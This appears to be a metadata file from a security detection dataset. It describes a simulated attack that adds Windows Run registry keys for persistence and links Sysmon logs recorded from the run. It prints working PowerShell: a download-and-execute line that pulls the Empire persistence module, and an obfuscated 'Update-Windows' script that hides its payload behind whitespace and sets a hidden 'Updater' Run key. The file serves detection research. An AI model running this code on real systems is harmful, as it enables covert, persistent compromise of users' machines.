id: 190319-RunKeysModification-Userland
title: Userland Registry Run Key Modification
description: This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run) for persistence.
references:

collaborators:
  - Roberto Rodriguez @Cyb3rWard0g
creation_date: 2019/03/19
modification_date: 2022/09/22
platform:
  - Windows
type: atomic
tags:
  - Userland
  - Registry Run Keys

attack_mappings:
  - technique: T1547
    sub-technique: "001"
    tactics:
      - TA0003

datasets:
  endpoint:
    - log_source: Microsoft-Windows-Sysmon
      size: 102.27 kB
      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190319-RunKeysModification-UserlandRunKey/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip

simulation:
  executor: PowerShell
  scriptUri: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
  supportingFileUris:
  commands: |-
    Adversary Box
    -------------
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1')
    
    $InvokeWhoami= { Invoke-Expression whoami }
    $UserOptions = New-UserPersistenceOption -Registry -AtLogon
    $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtLogon
    Add-Persistence -ScriptBlock $InvokeWhoami -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose

    Victim Box
    ----------
    Open a non-elevated PowerShell session
    Run the contents of the script (Persistence.ps1) created in the previous steps

    FILE:
    -----
    function Update-Windows{
    Param([Switch]$Persist)
    $ErrorActionPreference='SilentlyContinue'
    $Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('U/DMK8vPTtV1rSgoSi0uzszPUyjPyE/MzVQAAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
    if($Persist){
    if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
    {$Prof=$PROFILE.AllUsersAllHosts;$Payload='New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
    else
    {$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
    if(!(Test-Path $Prof)){New-Item -Path $Prof -Type File -Force}
    ' '*600+$Script.ToString()|Out-File $Prof -A -NoC -Fo
    iex $Payload|Out-Null
    Write-Output $Payload}
    else
    {$Script.Invoke()}
    } Update-Windows -Persist

    Run
    ---
    .\Persistence.ps1
    New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"
  output: |-
    
detection: